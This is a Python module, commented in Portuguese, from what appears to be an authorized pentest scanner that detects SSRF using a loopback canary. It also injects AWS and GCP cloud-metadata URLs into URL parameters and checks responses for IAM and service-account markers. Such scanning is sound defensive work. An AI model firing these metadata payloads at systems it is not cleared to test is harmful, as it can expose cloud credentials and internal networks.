"""SSRF ativo (AUTORIZADO) — verifica se um parâmetro que recebe URL faz o
SERVIDOR buscar um endereço que não devia (metadados da nuvem, rede interna).

Método:
  1. sobe um CANÁRIO em loopback (127.0.0.1) com um token único;
  2. troca o parâmetro-URL pelo canário e observa se o servidor o BUSCA
     (o canário recebe hit) — pega SSRF mesmo cego (in-band ou não), desde que
     o alvo consiga alcançar o canário (mesma máquina/rede);
  3. sonda metadados de nuvem (AWS/GCP) e detecta reflexo no corpo (in-band).

Guardrails: só host no ESCOPO com POSSE comprovada; método que muda estado
exige opt-in; payloads limitados; canário só em loopback. SSRF cego sem canário
alcançável é reportado como LIMITAÇÃO (precisa de coletor externo/OOB).
"""

from __future__ import annotations

import secrets
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from .evidence import CollectionStatus, Evidence, preserve_artifact
from .findings import Finding, Severity, Status
from .replay import Req, _send, _swap_param, authorized_target
from .scope import _host_of
from .verdict import EvidenceTier

# nomes de parâmetro que costumam receber URL (candidatos a SSRF)
URL_PARAM_HINTS = {
    "url", "uri", "link", "src", "source", "dest", "destination", "redirect",
    "redirect_uri", "next", "callback", "return", "returnurl", "feed", "image",
    "img", "imageurl", "file", "path", "target", "to", "u", "host", "domain",
    "webhook", "proxy", "fetch", "load", "page", "site", "open", "continue",
}

# sondas de metadados de nuvem: se o corpo refletir isto, é SSRF in-band.
_META_PAYLOADS = [
    ("AWS metadata", "http://169.254.169.254/latest/meta-data/",
     ("ami-id", "instance-id", "iam/", "hostname", "public-keys")),
    ("GCP metadata", "http://metadata.google.internal/computeMetadata/v1/",
     ("computeMetadata", "project", "instance/", "service-accounts")),
]


def find_url_params(url: str, body: str = "") -> list[str]:
    """Params (query + corpo) que parecem receber URL (nome ou valor http...)."""
    import json as _json
    import re
    from urllib.parse import parse_qsl, urlsplit
    found: list[str] = []
    seen: set = set()

    def _add(name: str, value: str = ""):
        n = (name or "").strip()
        if not n or n in seen:
            return
        if n.lower() in URL_PARAM_HINTS or str(value).lower().startswith(("http://", "https://")):
            seen.add(n)
            found.append(n)

    for k, v in parse_qsl(urlsplit(url).query):
        _add(k, v)
    if body:
        try:
            obj = _json.loads(body)
            if isinstance(obj, dict):
                for k, v in obj.items():
                    _add(k, v if isinstance(v, str) else "")
        except Exception:  # noqa: BLE001
            for k, v in re.findall(r'"([^"]+)"\s*:\s*"([^"]*)"', body):
                _add(k, v)
    return found


class _CanaryState:
    def __init__(self):
        self.hits: list[str] = []


def _start_canary(token: str):
    state = _CanaryState()

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            state.hits.append(self.path)
            body = f"canary-{token}".encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
    srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, srv.server_address[1], state


def run_ssrf(session, scope, req: Req, param: str | None = None,
             allow_side_effects: bool = False, timeout: int = 15) -> list[Finding]:
    ok, reason = authorized_target(req.url, scope)
    if not ok:
        raise PermissionError(reason)
    if req.method.upper() not in ("GET", "HEAD") and not allow_side_effects:
        raise PermissionError(
            f"{req.method} pode mudar estado; use --com-efeito-colateral se for "
            "seguro no SEU alvo.")

    params = [param] if param else find_url_params(req.url, req.body)
    if not params:
        raise ValueError("nenhum parâmetro de URL encontrado; informe --param")

    token = secrets.token_hex(8)
    srv, cport, state = _start_canary(token)
    canary = f"http://127.0.0.1:{cport}/{token}"
    log: list[dict] = []
    findings: list[Finding] = []
    try:
        for p in params:
            # 1) canário — o servidor busca a URL que passamos?
            u2, b2 = _swap_param(req.url, req.body, p, canary)
            s, raw, coll = _send(req.method, u2, req.headers, b2, timeout=timeout)
            time.sleep(0.4)  # dá tempo do fetch server-side chegar
            hit = any(token in h for h in state.hits)
            reflected = token in (raw or "")
            log.append({"param": p, "payload": "canario", "status": s,
                        "canary_hit": hit, "reflected": reflected})
            if hit or reflected:
                findings.append(Finding(
                    target=_host_of(req.url),
                    title=f"SSRF confirmável em '{p}' (servidor buscou URL externa)",
                    status=Status.SUSPECTED, severity=Severity.CRITICAL,
                    impact="O servidor faz requisições para URLs que você controla "
                           "— permite alcançar rede interna/metadados.",
                    remediation="Validar/allowlist de destino no servidor; bloquear "
                                "IPs internos e 169.254.169.254; sem redirecionamento.",
                    engine="ssrf"))
                continue
            # 2) metadados de nuvem (in-band)
            for label, mp, markers in _META_PAYLOADS:
                mu, mb = _swap_param(req.url, req.body, p, mp)
                ms, mraw, _c = _send(req.method, mu, req.headers, mb, timeout=timeout)
                low = (mraw or "").lower()
                got = [m for m in markers if m.lower() in low]
                log.append({"param": p, "payload": label, "status": ms,
                            "markers": got})
                if got:
                    findings.append(Finding(
                        target=_host_of(req.url),
                        title=f"SSRF para metadados da nuvem via '{p}' ({label})",
                        status=Status.SUSPECTED, severity=Severity.CRITICAL,
                        impact="Resposta refletiu metadados da nuvem — credenciais "
                               "temporárias podem vazar.",
                        remediation="Bloquear 169.254.169.254/metadata; allowlist de "
                                    "destino; IMDSv2.", engine="ssrf"))
    finally:
        srv.shutdown()
        srv.server_close()

    # evidência (sem segredos; o token do canário é efêmero)
    import json
    raw = json.dumps({"alvo": req.url, "parametros": params, "log": log,
                      "nota": "SSRF cego sem canário alcançável precisa de coletor "
                              "externo (OOB) — não coberto aqui."},
                     ensure_ascii=False, indent=2)
    ev = Evidence(target=req.url, tool="ssrf", params=f"ssrf {','.join(params)}",
                  source=req.url, result_summary=f"params={len(params)} "
                  f"achados={len(findings)}", status=CollectionStatus.OK,
                  tier=EvidenceTier.TOOL_OBSERVED)
    stored = session.add_evidence(ev.to_dict())
    ev.id = stored["id"]
    path, digest = preserve_artifact(session.artifacts, ev.id, raw)
    evs = session.evidence()
    for e in evs:
        if e.get("id") == ev.id:
            e["artifact_path"], e["artifact_sha256"] = path, digest
    from .store import write_json
    write_json(session.dir / "evidence.json", evs)
    for f in findings:
        f.evidence_ids = [ev.id]
        session.add_finding(f.to_dict())
    return findings
